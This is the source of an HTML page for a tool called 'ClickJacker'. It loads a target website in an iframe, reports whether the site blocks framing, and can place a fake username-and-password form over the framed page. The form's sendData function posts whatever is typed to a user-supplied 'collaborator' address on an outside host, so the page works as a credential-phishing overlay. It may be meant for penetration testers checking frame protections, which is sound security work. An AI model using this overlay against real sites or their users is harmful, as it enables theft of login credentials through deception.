<!DOCTYPE html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="/static/index.css">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700"/>
	<title>ClickJacker</title>

	<script type="text/javascript">
		var elIframe, elWebInput, elCollabInput, elHistory;
		var HISTORY_LIMIT = 20;

		function setFrameStatus(state) {
			var badge = document.getElementById("frame-status");
			badge.className = "status-badge " + state;
			badge.textContent = state === "framed" ? "Framed" : state === "blocked" ? "Blocked" : "Loading...";
		}

		function attachFrameListener() {
			elIframe.addEventListener("load", function() {
				try {
					var href = elIframe.contentWindow.location.href;
					// Readable href means either a same-origin page or a browser
					// error/blocked page. Any about: URL (including Firefox's
					// about:neterror) and Chrome's chrome-error: scheme both
					// indicate the frame was denied.
					if (!href ||
						href === "about:blank" ||
						href.startsWith("about:") ||
						href.startsWith("chrome-error:") ||
						href.startsWith("chrome://")) {
						setFrameStatus("blocked");
					} else {
						setFrameStatus("framed");
					}
				} catch(e) {
					// SecurityError: cross-origin page loaded successfully in iframe
					setFrameStatus("framed");
				}
			});
		}

		function loadWebsite() {
			var url = elWebInput.value.trim();
			if (!url) return;
			setFrameStatus("loading");
			elIframe.src = url;
			addToHistory(url);
		}

		function addToHistory(url) {
			var items = elHistory.querySelectorAll("li");
			for (var i = 0; i < items.length; i++) {
				if (items[i].dataset.url === url) return;
			}
			// Enforce history cap
			if (items.length >= HISTORY_LIMIT) {
				elHistory.removeChild(elHistory.lastElementChild);
			}

			var li = document.createElement("li");
			li.dataset.url = url;
			li.title = url;

			var label = document.createElement("span");
			label.className = "url-label";
			label.textContent = url;

			var btn = document.createElement("button");
			btn.className = "url-load";
			btn.textContent = "Load";
			btn.onclick = (function(u) {
				return function() {
					elWebInput.value = u;
					setFrameStatus("loading");
					elIframe.src = u;
				};
			})(url);

			li.appendChild(label);
			li.appendChild(btn);
			elHistory.prepend(li);
		}

		function clickjackOverlay() {
			if (document.getElementById("overlay")) return;

			var link = document.createElement("link");
			link.setAttribute("rel", "stylesheet");
			link.setAttribute("href", "/static/clickjack.css");

			var overlay = document.createElement("div");
			overlay.id = "overlay";
			overlay.innerHTML = `<form id="signin_form" method="POST" action="javascript:sendData()">
				<label>Username:</label>
				<input name="username" id="username" type="text">
				<label>Password:</label>
				<input name="password" id="password" type="password">
				<input type="submit" value="Submit">
			</form>`;

			document.head.appendChild(link);
			document.getElementById("wrapper").appendChild(overlay);

			var resetBtn = document.getElementById("overlay-reset");
			if (resetBtn) resetBtn.style.display = "inline-block";
		}

		function removeOverlay() {
			var overlay = document.getElementById("overlay");
			if (overlay) overlay.parentNode.removeChild(overlay);
			var resetBtn = document.getElementById("overlay-reset");
			if (resetBtn) resetBtn.style.display = "none";
		}

		async function sendData() {
			var signinForm = document.querySelector("#signin_form");
			var formData = new FormData(signinForm);
			try {
				var response = await fetch(elCollabInput.value, {
					method: "POST",
					body: formData,
				});
				console.log(await response.json());
			} catch (e) {
				console.error(e);
			}
		}

		document.addEventListener("DOMContentLoaded", function() {
			elIframe      = document.getElementsByName("website")[0];
			elWebInput    = document.getElementsByName("webInput")[0];
			elCollabInput = document.getElementsByName("collabInput")[0];
			elHistory     = document.getElementById("url-history");

			attachFrameListener();

			if (elIframe.src && elIframe.src !== "about:blank" && elIframe.src !== window.location.href) {
				addToHistory(elIframe.src);
			}

			elWebInput.addEventListener("keydown", function(e) {
				if (e.key === "Enter") loadWebsite();
			});
		});
	</script>
</head>
<body>
	<nav>
		{{if .Logo}}<img id="nav-logo" src="{{.Logo}}" alt="Logo">{{end}}
		ClickJacker
	</nav>

	<div id="wrapper">
		<div id="controls">
			<div class="control-row">
				<span class="control-label">Web page to clickjack:</span>
				<input name="webInput" value="{{.Site}}">
				<button onclick="loadWebsite()">Submit</button>
				<span id="frame-status" class="status-badge"></span>
			</div>
			<div class="control-row">
				<span class="control-label">Collaborator address:</span>
				<input name="collabInput" value="{{.Collab}}">
				<button onclick="clickjackOverlay()">Clickjack</button>
				<button id="overlay-reset" onclick="removeOverlay()" style="display:none;">Remove Overlay</button>
			</div>
		</div>

		<div id="history-panel">
			<div id="history-title">Session History</div>
			<ul id="url-history"></ul>
		</div>

		<iframe name="website" src="{{.Site}}"></iframe>
	</div>
</body>
</html>
